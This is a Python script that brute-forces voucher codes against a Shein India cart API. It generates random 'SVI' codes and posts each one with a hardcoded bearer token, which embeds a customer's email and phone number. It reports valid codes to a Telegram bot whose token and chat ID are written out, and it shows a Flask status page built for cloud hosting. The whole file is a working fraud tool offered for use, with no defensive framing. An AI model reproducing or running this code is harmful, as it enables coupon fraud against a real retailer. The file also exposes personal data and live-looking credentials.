import aiohttp
import asyncio
import random
import string
import os
from flask import Flask
from threading import Thread

# --- CONFIGURATION ---
API_URL = "https://api.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/akahau@gmail.com/carts/SH6505704526/vouchers"
HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzaGVpbl9ha2FoYXVAZ21haWwuY29tIiwicGtJZCI6IjkxYzhlZWI1LWYxM2UtNGU0Yi04N2YxLWYxNTI5ZDA3YTI0YiIsImNsaWVudE5hbWUiOiJ0cnVzdGVkX2NsaWVudCIsInJvbGVzIjpbeyJuYW1lIjoiUk9MRV9DVVNUT01FUkdST1VQIn1dLCJtb2JpbGUiOiI2Mzg2ODE0NTE4IiwidGVuYW50SWQiOiJTSEVJTiIsImV4cCI6MTc3MTM0MjkyNiwidXVpZCI6IjkxYzhlZWI1LWYxM2UtNGU0Yi04N2YxLWYxNTI5ZDA3YTI0YiIsImlhdCI6MTc2ODc1MDkyNiwiZW1haWwiOiJha2FoYXVAZ21haWwuY29tIn0.wVkfjof9paE3Lr_w1unjnRsZfMZEwVPrs2LdYTP_q4QtYbpuwjEqOOQmimjivl9xGFdQdIf1SMCD9yeaOwEPb3Ak0LRYt6fuvhIMHzq3RiUB9QN90EScLcTy3zoFfmmSPSzIMxY0GS6MYn5VuxX-2DvbR5pOjLRwEfhoeKCpMbXHueJ8dRdHKjVGhlg89LMzHqOEBxQiKiW_CnCDh0mAvb6weWXBS4-vk78wS_1_iLbfbqieRYHk7QKjkBrUaKX0Vmh00FC9R8iBhNH8cV0_aH9VvvAz6UMkCF9ElTLBGtHNHT_7VE7Fc16gM7jRRNluWJPfBd1_VIzGvSvwBpcJ_g",
    "Accept": "application/json",
    "User-Agent": "Android",
    "Content-Type": "application/x-www-form-urlencoded",
}

# --- TELEGRAM CONFIG ---
TG_TOKEN = "7960235034:AAGspuayD8vd-CnAkGp1LjpUv2RhcoopqKU"
TG_CHAT_ID = "7177581474"

# --- GLOBAL COUNTERS ---
stats = {
    "total_tries": 0,
    "valid": 0,
    "invalid": 0,
    "last_notified": 0
}

# --- FLASK APP FOR RENDER ---
app = Flask(__name__)

@app.route('/')
def home():
    return f"""
    <html>
        <head><title>Bot Status</title></head>
        <body style="font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f9;">
            <div style="display: inline-block; background: white; padding: 30px; border-radius: 15px; shadow: 0 4px 8px rgba(0,0,0,0.1);">
                <h1>🚀 SVI Checker Live</h1>
                <hr>
                <p style="font-size: 20px;"><b>Total Tries:</b> {stats['total_tries']}</p>
                <p style="font-size: 20px; color: #28a745;"><b>Valid Found:</b> {stats['valid']}</p>
                <p style="font-size: 20px; color: #dc3545;"><b>Invalid:</b> {stats['invalid']}</p>
                <p style="font-size: 12px; color: #666;">Page refreshes on reload</p>
            </div>
        </body>
    </html>
    """

# --- TELEGRAM SENDER ---
async def send_telegram_msg(session, message):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        async with session.post(url, json=payload) as resp:
            pass
    except:
        pass

# --- GENERATOR ---
def generate_batch(count=50):
    prefix = "SVI"
    chars = string.ascii_uppercase + string.digits
    return [prefix + ''.join(random.choices(chars, k=12)) for _ in range(count)]

# --- CHECKER ---
async def check_coupon(session, coupon):
    payload = {"voucherId": coupon, "employeeOfferRestriction": "true"}
    try:
        async with session.post(API_URL, data=payload) as r:
            text = await r.text()
            error_words = ["error", "invalid", "expired", "not found", "denied"]
            
            stats['total_tries'] += 1
            
            if r.status in [200, 201] and not any(w in text.lower() for w in error_words) and len(text.strip()) > 0:
                stats['valid'] += 1
                await send_telegram_msg(session, f"<b>✅ VALID CODE!</b>\n\nCode: <code>{coupon}</code>\nTotal Tries: {stats['total_tries']}")
            else:
                stats['invalid'] += 1
                
    except Exception:
        pass

# --- BACKGROUND WORKER ---
async def worker_loop():
    sem = asyncio.Semaphore(5)
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        await send_telegram_msg(session, "✅ <b>SVI Checker is now Online!</b>\nI will notify you every 1,000 tries.")
        
        while True:
            coupons = generate_batch(50)
            tasks = [check_coupon(session, c) for c in coupons]
            await asyncio.gather(*tasks)
            
            # Send status update every 1000 tries
            if stats['total_tries'] - stats['last_notified'] >= 1000:
                stats['last_notified'] = stats['total_tries']
                msg = (f"📊 <b>Periodic Status Report</b>\n"
                       f"Total Tries: {stats['total_tries']}\n"
                       f"Valid Found: {stats['valid']}\n"
                       f"Invalid: {stats['invalid']}")
                await send_telegram_msg(session, msg)

            await asyncio.sleep(0.5)

def start_checker():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(worker_loop())

# --- LAUNCH ---
if __name__ == "__main__":
    Thread(target=start_checker, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
